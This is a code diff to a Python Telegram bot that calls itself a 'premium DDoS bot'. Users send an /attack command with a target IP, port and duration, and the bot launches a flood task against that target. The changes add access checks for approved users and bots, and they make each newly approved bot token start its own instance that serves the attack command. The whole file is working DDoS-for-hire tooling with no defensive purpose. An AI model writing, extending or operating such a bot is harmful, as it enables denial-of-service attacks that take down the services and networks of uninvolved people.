@@ -46,9 +46,19 @@ async def is_valid_bot_token(token):
 approved_ids = load_approved_ids()
 approved_bots = load_approved_bots()
 
+# Helper function to check access
+def is_approved_user_or_bot(chat_id, user_id):
+    return str(chat_id) in approved_ids or str(user_id) in approved_ids or str(chat_id) in approved_bots.keys()
+
 # Start command
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
+    user_id = update.effective_user.id
+
+    if not is_approved_user_or_bot(chat_id, user_id):
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You are not authorized to use this bot.*", parse_mode='Markdown')
+        return
+
     message = (
         "*𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐆𝐎𝐃x𝐂𝐇𝐄𝐀𝐓𝐒 𝐃𝐃𝐎𝐒  *\n"
         "*PRIMIUM DDOS BOT*\n"
@@ -78,9 +88,11 @@ async def approve(update: Update, context: CallbackContext):
             save_approved_bots(approved_bots)
             await context.bot.send_message(
                 chat_id=chat_id,
-                text=f"*✅ Bot {bot_username} approved with token.*",
+                text=f"*✅ Bot {bot_username} approved with token.*\n*Starting the bot...*",
                 parse_mode='Markdown'
             )
+            # Start the approved bot
+            asyncio.create_task(start_approved_bot(target_id_or_token))
         else:
             await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid Bot Token.*", parse_mode='Markdown')
     else:  # Assume it's a User or Group ID
@@ -119,10 +131,10 @@ async def attack(update: Update, context: CallbackContext):
     global attack_in_progress
 
     chat_id = update.effective_chat.id
-    user_id = str(update.effective_user.id)
+    user_id = update.effective_user.id
     args = context.args
 
-    if str(chat_id) not in approved_ids and user_id not in approved_ids:
+    if not is_approved_user_or_bot(chat_id, user_id):
         await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need permission to use this bot.*", parse_mode='Markdown')
         return
 
@@ -140,7 +152,6 @@ async def attack(update: Update, context: CallbackContext):
         f"*⭐ Target » {ip}*\n"
         f"*⭐ Port » {port}*\n"
         f"*⭐ Time » {time} seconds*\n"
-        f"*https://t.me/+03wLVBPurPk2NWRl*\n"
     ), parse_mode='Markdown')
 
     asyncio.create_task(run_attack(chat_id, ip, port, time, context))
@@ -168,7 +179,14 @@ async def run_attack(chat_id, ip, port, time, context):
 
     finally:
         attack_in_progress = False
-        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 ✅*\n*SEND FEEDBACK TO OWNER*\n*@GODxAloneBOY*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 ✅*", parse_mode='Markdown')
+
+# Start an approved bot instance
+async def start_approved_bot(bot_token):
+    application = Application.builder().token(bot_token).build()
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("attack", attack))
+    application.run_polling()
 
 # Main function
 def main():
